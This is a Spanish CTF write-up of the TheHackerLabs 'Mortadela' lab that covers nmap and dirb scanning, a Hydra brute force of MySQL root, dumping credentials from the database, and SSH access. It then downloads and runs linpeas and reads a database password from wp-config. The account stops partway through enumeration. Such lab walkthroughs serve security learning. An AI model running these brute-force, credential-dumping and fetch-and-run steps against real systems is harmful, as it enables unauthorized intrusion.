---
title: "TheHackerLabs - Principiante : [Mortadela]"
date: 2024-07-16 17:35:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
tags: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
image: /img/posts/CTF/mortadela/mortadela.png
---

Exploramos el desafío **"Mortadela"**, un CTF ideal para aquellos que están comenzando en el mundo del hacking. Este reto, alojado en un entorno Linux, ha sido meticulosamente diseñado por `Condor y Curiosidades De Hackers` para enseñar los fundamentos del hacking y la administración de sistemas en un contexto práctico y atractivo.

🌐 [**Web oficial del CTF: TheHackersLabs - Mortadela**](https://thehackerslabs.com/mortadela/){:target="_blank"}


## Paso 1: Determinando nuestra interfaz de red

Para comenzar, necesitamos determinar cuál es nuestra interfaz de red activa. Utilizamos el comando `ip a` para listar todas las interfaces de red disponibles y sus detalles.

```shell
❯ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:21:fc:cb brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.5/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 533sec preferred_lft 533sec
    inet6 fe80::a00:27ff:fe21:fccb/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

En este caso, nuestra interfaz activa es `eth0` con la dirección IP `10.0.2.5`.

## Paso 2: Escaneo de red en busca de dispositivos

Ahora realizamos un escaneo de red para identificar otros dispositivos conectados en la misma red. Utilizamos `arp-scan` para este propósito. En un post anterior, hice una guía sobre cómo usar este comando: [Consiguiendo la IP de la víctima en CTF](posts/consiguiendo-la-ip-victima-CTF/).

```shell
❯ arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 08:00:27:21:fc:cb, IPv4: 10.0.2.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:3b:27:17       PCS Systemtechnik GmbH
10.0.2.15       08:00:27:8b:e4:4c       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.301 seconds (111.26 hosts/sec). 4 responded
```

La IP de la víctima identificada es `10.0.2.15`.

## Paso 3: Escaneo con Nmap

### ¿Qué es Nmap?

Nmap (Network Mapper) es una herramienta de código abierto para la exploración de redes y auditoría de seguridad. Es extremadamente útil para descubrir hosts y servicios en una red, permitiendo una amplia variedad de tareas como la enumeración de puertos abiertos, la detección de versiones de servicios y la identificación del sistema operativo. 

Beneficios de Nmap:
- **Detección de vulnerabilidades**: Identifica puertos y servicios abiertos que pueden ser vulnerables.
- **Enumeración de redes**: Mapea una red para obtener una vista completa de los dispositivos conectados.
- **Auditoría de seguridad**: Ayuda a evaluar la seguridad de una red.

### Comando Nmap Detallado

Antes de ejecutar los escaneos, vamos a desglosar los parámetros utilizados en los comandos de `nmap`.

#### Primer escaneo: Todos los puertos

```shell
nmap -sS -p- -vvv -Pn -n --min-rate 2000 -oG allports 10.0.2.15
```

- **-sS**: Realiza un escaneo de puertos TCP SYN (half-open scan).
- **-p-**: Escanea todos los puertos (1-65535).
- **-vvv**: Muestra información detallada y verbosa del proceso.
- **-Pn**: Indica que no se realice un ping previo a la máquina objetivo (asume que está activa).
- **-n**: No resuelve nombres DNS.
- **--min-rate 2000**: Envía paquetes a una tasa mínima de 2000 por segundo.
- **-oG allports**: Guarda el resultado en un archivo en formato grepeable (grepable).

#### Segundo escaneo: Servicios específicos

```shell
nmap -sSCV -p22,80,3306 -vvv 10.0.2.15 -oN ports
```

- **-sS**: Realiza un escaneo de puertos TCP SYN (half-open scan).
- **-sC**: Ejecuta scripts NSE (Nmap Scripting Engine) por defecto.
- **-sV**: Detecta versiones de los servicios.
- **-p22,80,3306**: Especifica los puertos a escanear (22 para SSH, 80 para HTTP, 3306 para MySQL).
- **-vvv**: Muestra información detallada y verbosa del proceso.
- **-oN ports**: Guarda el resultado en un archivo en formato normal.

### Resultados del Primer Escaneo

Ejecutamos el primer comando para escanear todos los puertos:

```shell
❯ nmap -sS -p- -vvv -Pn -n --min-rate 2000 -oG allports 10.0.2.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-15 12:27 CEST
# Nmap scan report for 10.0.2.15
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
# Host: 10.0.2.15 ()  Status: Up
# Host: 10.0.2.15 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3306/open/tcp//mysql///   Ignored State: closed (65532)
# Nmap done at Mon Jul 15 12:27:34 2024 -- 1 IP address (1 host up) scanned in 24.75 seconds
```

### Resultados del Segundo Escaneo

A continuación, ejecutamos el segundo comando para escanear puertos específicos y detectar servicios:

```shell
❯ nmap -sSCV -p22,80,3306 -vvv 10.0.2.15 -oN ports
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 aa:8d:e4:75:bc:f3:f8:5e:42:d0:ee:ca:e2:c4:0b:97 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCv+zG8LVzE4Ej88gQLOyfc9WwWHB2zfB3A/DPiiihYeYD+CWtwwTdI8oPZF1yXg8qCwzbw81hhCovHESbXrEaI=
|   256 ae:fd:91:ef:42:71:cb:11:b9:66:97:bf:ec:5b:d6:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC5WjHTcCz/y7ILMqyKrV62BJGHC2dwfEFBPaLgLFwVf
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.57 (Debian)
3306/tcp open  mysql   syn-ack ttl 64 MySQL 5.5.5-10.11.6-MariaDB-0+deb12u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.6-MariaDB-0+deb12u1
|   Thread ID: 33
|   Capabilities flags: 63486
|   Some Capabilities: SupportsLoadDataLocal, IgnoreSigpipes, Support41Auth, SupportsTransactions, ODBCClient, Speaks41ProtocolNew, InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: scs;h|X"<I:)Zm4W>n2L
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:8B:E4:4C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En este escaneo, identificamos que los siguientes puertos están abiertos en la máquina víctima:
- **22/tcp**: OpenSSH 9.2p1
- **80/tcp**: Apache httpd 2.4.57
- **3306/tcp**: MySQL 5.5.5-10.11.6-MariaDB

Con esta información, sabemos qué servicios están corriendo y podemos planificar nuestros próximos pasos para explorar y explotar posibles vulnerabilidades.

## Paso 4: Exploración del servidor web Apache

De momento no tenemos información ni posibles usuarios para empezar un ataque de fuerza bruta. Vamos a inspeccionar el servidor Apache en el puerto `80`.

Es un Apache normal y corriente por defecto, sin nada en la página principal ni en el código fuente. Para descubrir directorios y archivos ocultos, lanzamos un escaneo con `dirb`.

### Encontramos un Wordpress

Ejecutamos el siguiente comando:

```shell
dirb http://10.0.2.15

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jul 15 13:49:07 2024
URL_BASE: http://10.0.2.15/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.2.15/ ----
+ http://10.0.2.15/index.html (CODE:200|SIZE:10701)                                                                                                                                                                                                                                                                       
+ http://10.0.2.15/server-status (CODE:403|SIZE:274)                                                                                                                                                                                                                                                                      
==> DIRECTORY: http://10.0.2.15/wordpress/                                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/ ----
+ http://10.0.2.15/wordpress/index.php (CODE:301|SIZE:0)                                                                                                                                                                                                                                                                  
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/                                                                                                                                                                                                                                                                       
==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/                                                                                                                                                                                                                                                                     
==> DIRECTORY: http://10.0.2.15/wordpress/wp-includes/                                                                                                                                                                                                                                                                    
+ http://10.0.2.15/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/ ----
+ http://10.0.2.15/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                         
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/css/                                                                                                                                                                                                                                                                   
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/images/                                                                                                                                                                                                                                                                
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/includes/                                                                                                                                                                                                                                                              
+ http://10.0.2.15/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                         
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/js/                                                                                                                                                                                                                                                                    
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/maint/                                                                                                                                                                                                                                                                 
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/network/                                                                                                                                                                                                                                                               
==> DIRECTORY: http://10.0.2.15/wordpress/wp-admin/user/                                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-content/ ----
+ http://10.0.2.15/wordpress/wp-content/index.php (CODE:200|SIZE:0)                                                                                                                                                                                                                                                       
==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/languages/                                                                                                                                                                                                                                                           
==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/plugins/                                                                                                                                                                                                                                                             
==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/themes/                                                                                                                                                                                                                                                              
==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/upgrade/                                                                                                                                                                                                                                                             
==> DIRECTORY: http://10.0.2.15/wordpress/wp-content/uploads/                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/network/ ----
+ http://10.0.2.15/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                 
+ http://10.0.2.15/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-admin/user/ ----
+ http://10.0.2.15/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                    
+ http://10.0.2.15/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-content/languages/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-content/plugins/ ----
+ http://10.0.2.15/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-content/themes/ ----
+ http://10.0.2.15/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                                                                                                          
---- Entering directory: http://10.0.2.15/wordpress/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Jul 15 13:50:35 2024
DOWNLOADED: 36896 - FOUND: 13
```

Ya tenemos por donde empezar.



### Reflexión: No te detengas

Paramos aquí.... viene un consejo.

Lo he dicho en otros posts, no tenemos que ir a lo loco, pero sí "por faena". Mientras se está realizando un escaneo, como el anterior de `dirb`, podemos ir realizando pruebas. Teníamos los puertos 22 y 3306 abiertos. Lanzamos un `hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.15`, y mientras documento el `dirb` anterior, me encuentro una sorpresa:

```shell
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.15
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-15 14:19:10
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.0.2.15:3306/
[3306][mysql] host: 10.0.2.15   login: root   password: cassandra
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-15 14:19:27
```

:)

Dejamos apartado el Wordpress y vamos a acceder como root en MySQL.



### Acceso a MySQL

Con las credenciales obtenidas, procedemos a conectarnos al servidor MySQL:

```shell
❯ mysql -u root -p -h 10.0.2.15
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2067
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Vamos a buscar bases de datos, tablas, contenido...

```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| confidencial       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0.006 sec)

MariaDB [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
+-----------------------------+
| Tables_in_wordpress         |
+-----------------------------+
| wp_commentmeta              |
| wp_comments                 |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
| wp_wc_avatars_cache         |
| wp_wc_comments_subscription |
| wp_wc_feedback_forms        |
| wp_wc_follow_users          |
| wp_wc_phrases               |
| wp_wc_users_rated           |
| wp_wc_users_voted           |
+-----------------------------+
19 rows in set (0.002 sec)

MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+------------+--------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email | user_url                       | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------+--------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | mortadela  | $P$Bsftyr1agoUTYzf79H.zkgGURjn.4e0 | mortadela     | a@a.com    | http://192.168.0.108/wordpress | 2024-04-01 16:47:01 |                     |           0 | mortadela    |
+----+------------+------------------------------------+---------------+------------+--------------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.002 sec)
```

También exploramos la tabla de comentarios:

```sql
MariaDB [wordpress]> select * from wp_comments;
+------------+-----------------+------------------------------+-------------------------+---------------------------+-------------------+---------------------+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------------+---------------+--------------+----------------+---------+
| comment_ID | comment_post_ID | comment_author               | comment_author_email    | comment_author_url        | comment_author_IP | comment_date        | comment_date_gmt    | comment_content                                                                                                                                                                                                                                  | comment_karma | comment_approved | comment_agent | comment_type | comment_parent | user_id |
+------------+-----------------+------------------------------+-------------------------+---------------------------+-------------------+---------------------+---------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------------+---------------+--------------+----------------+---------+
|          1 |               1 | Un comentarista de WordPress | wapuu@wordpress.example | https://es.wordpress.org/ |                   | 2024-04-01 18:47:01 | 2024-04-01 16:47:01 | Hola, esto es un comentario.
Para empezar a moderar, editar y borrar comentarios, por favor, visita en el escritorio la pantalla de comentarios.
Los avatares de los comentaristas provienen de <a href="https://es.gravatar.com/">Gravatar</a>. |             0 | 1                |               | comment      |              0 |       0 |
```

Y la tabla de meta información de usuarios:

```sql
MariaDB [wordpress]> select * from wp_usermeta;
+----------+---------+---------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| umeta_id | user_id | meta_key                              | meta_value                                                                                                                                                                                                                                                        |
+----------+---------+---------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|        1 |       1 | nickname                              | mortadela                                                                                                                                                                                                                                                         |
|        2 |       1 | first_name                            |                                                                                                                                                                                                                                                                   |
|        3 |       1 | last_name                             |                                                                                                                                                                                                                                                                   |
|        4 |       1 | description                           |                                                                                                                                                                                                                                                                   |
|        5 |       1 | rich_editing                          | true                                                                                                                                                                                                                                                              |
|        6 |       1 | syntax_highlighting                   | true                                                                                                                                                                                                                                                              |
|        7 |       1 | comment_shortcuts                     | false                                                                                                                                                                                                                                                             |
|        8 |       1 | admin_color                           | fresh                                                                                                                                                                                                                                                             |
|        9 |       1 | use_ssl                               | 0                                                                                                                                                                                                                                                                 |
|       10 |       1 | show_admin_bar_front                  | true                                                                                                                                                                                                                                                              |
|       11 |       1 | locale                                |                                                                                                                                                                                                                                                                   |
|       12 |       1 | wp_capabilities                       | a:1:{s:13:"administrator";b:1;}                                                                                                                                                                                                                                   |
|       13 |       1 | wp_user_level                         | 10                                                                                                                                                                                                                                                                |
|       14 |       1 | dismissed_wp_pointers                 |                                                                                                                                                                                                                                                                   |
|       15 |       1 | show_welcome_panel                    | 1                                                                                                                                                                                                                                                                 |
|       16 |       1 | session_tokens                        | a:1:{s:64:"c1f41238f864feaad87c14777cb0b5662799ac1f304e0bffae7ebd25b58c1c19";a:4:{s:10:"expiration";i:1712162829;s:2:"ip";s:13:"192.168.0.105";s:2:"ua";s:70:"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0";s:5:"login";i:1711990029;}} |
|       17 |       1 | wp_dashboard_quick_press_last_post_id | 5                                                                                                                                                                                                                                                                 |
|       18 |       1 | community-events-location             | a:1:{s:2:"ip";s:11:"192.168.0.0";}                                                                                                                                                                                                                                |
+----------+---------+---------------------------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
18 rows in set (0.002 sec)
```

### Reflexión: Evitar los "rabbit holes"

Tenemos un hash y un token. Pero hemos entrado en un `rabbit hole`. Es importante reconocer cuando estamos desviándonos de nuestro objetivo principal. A veces, al explorar todas las opciones, podemos encontrarnos atrapados en detalles que no nos llevan a un progreso real. Por eso, volvemos a mirar las tablas para encontrar información más relevante y avanzar en nuestra misión.



MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| confidencial       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
6 rows in set (0.002 sec)

### Descubrimiento de la base de datos "confidencial"

Por favor..... ¿cómo no hemos visto la primera? Casi nos da un guantazo en toda la cara, diciéndonos algo...

```sql
MariaDB [(none)]> use confidencial;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [confidencial]> show tables;
+------------------------+
| Tables_in_confidencial |
+------------------------+
| usuarios               |
+------------------------+
1 row in set (0.002 sec)

MariaDB [confidencial]> select * from usuarios;
+-----------+------------------+
| usuario   | contraseña       |
+-----------+------------------+
| mortadela | Juanikokukunero8 |
+-----------+------------------+
1 row in set (0.002 sec)
```

Aquí tenemos un usuario y su contraseña sin encriptar. Descartamos Wordpress, nos queda el puerto 22.

### Acceso por SSH

Tachán....

```shell
❯ ssh mortadela@10.0.2.15
mortadela@10.0.2.15's password: 
Linux mortadela 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr  1 19:05:27 2024 from 192.168.0.105
mortadela@mortadela:~$ 
```

### Reflexión: El aprendizaje en cada paso

Antes tuvimos suerte encontrando con Hydra la password root, mientras analizábamos Wordpress. Evitamos una pérdida de tiempo muy grande, pero, el no ver la tabla `confidencial` nos ha hecho caer en otro agujero. Es lo maravilloso de este mundo **:)**

---

Continuaremos explorando desde aquí para descubrir qué más podemos encontrar en el sistema.




### Búsqueda de privilegios

Una vez dentro del sistema, buscamos cómo obtener privilegios de administrador.

```shell
mortadela@mortadela:~$ sudo -l
[sudo] contraseña para mortadela: 
Sorry, user mortadela may not run sudo on mortadela.
mortadela@mortadela:~$
```

Como no podemos utilizar `sudo -l`, vamos a descargarnos y ejecutar `linpeas`.


### ¿Qué es linpeas?

`linpeas` es una herramienta de enumeración para sistemas Linux, diseñada para ayudar a identificar posibles vectores de escalación de privilegios. Es parte del proyecto PEASS (Privilege Escalation Awesome Scripts Suite) y es ampliamente utilizada por los profesionales de seguridad para auditar sistemas y encontrar configuraciones y vulnerabilidades que podrían permitir a un atacante elevar sus privilegios.

#### ¿Para qué sirve linpeas?

- **Identificación de permisos y configuraciones incorrectas**: `linpeas` revisa los permisos de archivos y directorios críticos para encontrar posibles debilidades.
- **Detección de vulnerabilidades conocidas**: La herramienta busca configuraciones del sistema y aplicaciones que puedan estar expuestas a vulnerabilidades conocidas.
- **Revisión de credenciales y configuraciones de red**: `linpeas` examina configuraciones de red y posibles credenciales expuestas que podrían ser explotadas.
- **Análisis de servicios y procesos en ejecución**: Detecta servicios y procesos que pueden estar configurados de manera insegura o que son susceptibles a ataques.



### Descarga y ejecución de linpeas

Para descargar `linpeas`, ejecutamos el siguiente comando:

```shell
mortadela@mortadela:~$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
--2024-07-15 16:12:57--  https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
Resolviendo github.com (github.com)... 140.82.121.3
Conectando con github.com (github.com)[140.82.121.3]:443... conectado.
Petición HTTP enviada, esperando respuesta... 302 Found
Localización: https://github.com/peass-ng/PEASS-ng/releases/download/20240714-cd435bb2/linpeas_linux_amd64 [siguiendo]
--2024-07-15 16:12:57--  https://github.com/peass-ng/PEASS-ng/releases/download/20240714-cd435bb2/linpeas_linux_amd64
Reutilizando la conexión con github.com:443.
Petición HTTP enviada, esperando respuesta... 302 Found
Localización: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/2d53a892-7fbc-4cca-937e-e9496ba2cd26?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240715T141257Z&X-Amz-Expires=300&X-Amz-Signature=ec2b7fbc86e997dabeae7974ef471d4b0c54cce4caea93713f3354d6b451e14a&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas_linux_amd64&response-content-type=application%2Foctet-stream [siguiendo]
--2024-07-15 16:12:58--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/2d53a892-7fbc-4cca-937e-e9496ba2cd26?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20240715%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240715T141257Z&X-Amz-Expires=300&X-Amz-Signature=ec2b7fbc86e997dabeae7974ef471d4b0c54cce4caea93713f3354d6b451e14a&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=165548191&response-content-disposition=attachment%3B%20filename%3Dlinpeas_linux_amd64&response-content-type=application%2Foctet-stream
Resolviendo objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Conectando con objects.githubusercontent.com (objects.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3256264 (3,1M) [application/octet-stream]
Grabando a: «linpeas_linux_amd64»

linpeas_linux_amd64                                                            100%[===================================================================================================================================================================================================>]   3,10M  17,7MB/s    en 0,2s    

2024-07-15 16:12:58 (17,7 MB/s) - «linpeas_linux_amd64» guardado [3256264/3256264]

mortadela@mortadela:~$ ls
linpeas_linux_amd64  user.txt
```
Damos permisos al ejecutable

```bash
mortadela@mortadela:~$ chmod +x linpeas_linux_amd64 
```
Luego, ejecutamos `linpeas_linux_amd64` , indicando tee fichero , para que nos guarde la salida en `resultado_linpeas.txt` y poder consultarlo cuando queramos:

```shell
mortadela@mortadela:~$ ./linpeas_linux_amd64 | tee resultado_linpeas.txt
```

Analizaremos la salida de `linpeas` para identificar posibles vectores de escalación de privilegios.
![Imagen del resultado de arp-scan](/img/posts/CTF/mortadela/linpeas.png)




### Ejecución de linpeas

Nos hemos encontrado un premio. Menos mal que no estamos auditando :D .

```shell
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-rw-rw- 1 www-data www-data 3300 abr  1 18:46 /var/www/html/wordpress/wp-config.php                                                                                                                                                                                                                                     
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'lolalolitalola' );
define( 'DB_HOST', 'localhost' );
```

Me ha venido a la mente, **o mai loviuuuuuu naino naino naaaa**. Seguimos.



Esto es muy tentador.... Pero.... no vamos a caer.... No....

```shell
mortadela@mortadela:/etc/ssh$ ls -l
total 604                                                                                                                                                                                                                                                                                                                  
-rw-r--r-- 1 root root 573928 dic 19  2023 moduli                                                                                                                                                                                                                                                                          
-rw-r--r-- 1 root root   1650 dic 19  2023 ssh_config                                                                                                                                                                                                                                                                      
drwxr-xr-x 2 root root   4096 dic 19  2023 ssh_config.d                                                                                                                                                                                                                                                                    
-rw-r--r-- 1 root root   3208 abr  1 17:45 sshd_config                                                                                                                                                                                                                                                                     
drwxr-xr-x 2 root root   4096 dic 19  2023 sshd_config.d                                                                                                                                                                                                                                                                   
-rw------- 1 root root    505 abr  1 17:43 ssh_host_ecdsa_key                                                                                                                                                                                                                                                              
-rw-r--r-- 1 root root    176 abr  1 17:43 ssh_host_ecdsa_key.pub                                                                                                                                                                                                                                                          
-rw------- 1 root root    411 abr  1 17:43 ssh_host_ed25519_key                                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root     96 abr  1 17:43 ssh_host_ed25519_key.pub                                                                                                                                                                                                                                                        
-rw------- 1 root root   2602 abr  1 17:43 ssh_host_rsa_key                                                                                                                                                                                                                                                                
-rw-r--r-- 1 root root    568 abr  1 17:43 ssh_host_rsa_key.pub                                                                                                                                                                                                                                                            
mortadela@mortadela:/etc/ssh$      
```



Más información....

```shell
╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completcat //ion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
```

**¿Bingo?**

```shell
╔══════════╣ Unexpected in /opt (usually empty)
total 90880
